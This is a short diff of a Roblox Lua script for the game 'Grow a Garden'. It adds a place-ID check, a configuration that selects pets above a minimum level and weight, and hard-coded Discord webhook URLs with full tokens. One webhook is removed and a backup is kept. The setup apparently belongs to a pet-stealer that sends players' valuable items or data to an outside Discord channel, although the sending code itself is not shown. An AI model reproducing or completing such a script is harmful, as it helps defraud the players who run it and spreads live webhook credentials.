@@ -1,18 +1,14 @@
 if game.PlaceId ~= 126884695634066 then
-    game.Players.LocalPlayer:Kick("⚠️ This script works only in Grow a Garden.")
+    game.Players.LocalPlayer:Kick("⚠️ This script works only in Grow a Garden...")
     return
 end
 
 getgenv().PetConfig = {
     MinLevel = getgenv().MinLevel or 75,           -- минимальный возраст
-    MinWeight = getgenv().MinWeight or 20.0,         -- минимальный вес
-    GrowthFactor = 0.1       -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
+    MinWeight = getgenv().MinWeight or 20.0,       -- минимальный вес
+    GrowthFactor = 0.1                             -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
 }
 
-
-
-
-getgenv().Webhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
 getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
